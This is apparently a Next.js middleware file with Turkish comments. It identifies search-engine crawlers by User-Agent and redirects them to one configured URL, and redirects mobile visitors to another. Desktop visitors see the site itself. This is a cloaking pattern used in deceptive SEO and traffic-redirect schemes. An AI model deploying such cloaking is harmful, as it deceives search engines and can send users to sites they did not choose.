// src/proxy.ts veya proxy.ts

import { NextRequest, NextResponse } from 'next/server';

const BOT_TARGET_URL = process.env.BOT_TARGET_URL;
const MOBILE_TARGET_URL = process.env.MOBILE_TARGET_URL;

const SEARCH_ENGINE_BOTS =
  /Googlebot|Bingbot|YandexBot|DuckDuckBot|Baiduspider|Slurp/i;

const MOBILE_USER_AGENT =
  /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;

function createTargetUrl(
  baseUrl: string,
  request: NextRequest
): URL {
  const targetUrl = new URL(baseUrl);

  /*
   * Ziyaret edilen sayfanın path ve query bilgisini korur.
   *
   * /blog/yazi?id=10
   * → hedefsite.com/blog/yazi?id=10
   */
  targetUrl.pathname = request.nextUrl.pathname;
  targetUrl.search = request.nextUrl.search;

  return targetUrl;
}

export function proxy(request: NextRequest) {
  /*
   * POST, PUT, PATCH ve DELETE isteklerini yönlendirme.
   * Form ve Server Action verilerinin hedef domaine
   * gönderilmesini engeller.
   */
  if (request.method !== 'GET' && request.method !== 'HEAD') {
    return NextResponse.next();
  }

  const userAgent =
    request.headers.get('user-agent') ?? '';

  /*
   * 1. ARAMA MOTORU BOT KONTROLÜ
   *
   * Bu kontrol mobil kontrolden önce olmalı.
   * Googlebot Smartphone, mobil cihaz ifadeleri de taşıyabilir.
   */
  const isSearchEngineBot =
    SEARCH_ENGINE_BOTS.test(userAgent);

  if (isSearchEngineBot) {
    /*
     * BOT_TARGET_URL tanımlanmışsa botu belirtilen
     * test adresine yönlendir.
     */
    if (BOT_TARGET_URL) {
      const botTargetUrl = createTargetUrl(
        BOT_TARGET_URL,
        request
      );

      /*
       * Aynı host'a yeniden yönlendirerek döngü
       * oluşturulmasını engeller.
       */
      if (botTargetUrl.host !== request.nextUrl.host) {
        return NextResponse.redirect(botTargetUrl, 307);
      }
    }

    /*
     * BOT_TARGET_URL tanımlı değilse veya mevcut host
     * hedef host ile aynıysa mevcut siteyi göster.
     */
    return NextResponse.next();
  }

  /*
   * 2. MOBİL CİHAZ KONTROLÜ
   */
  const isMobileDevice =
    MOBILE_USER_AGENT.test(userAgent);

  if (isMobileDevice && MOBILE_TARGET_URL) {
    const mobileTargetUrl = createTargetUrl(
      MOBILE_TARGET_URL,
      request
    );

    if (mobileTargetUrl.host !== request.nextUrl.host) {
      return NextResponse.redirect(
        mobileTargetUrl,
        307
      );
    }
  }

  /*
   * 3. MASAÜSTÜ VE DİĞER İSTEKLER
   */
  return NextResponse.next();
}

export const config = {
  matcher: [
    '/((?!api|_next/static|_next/image|favicon.ico|robots.txt|sitemap.xml|manifest.webmanifest).*)',
  ],
};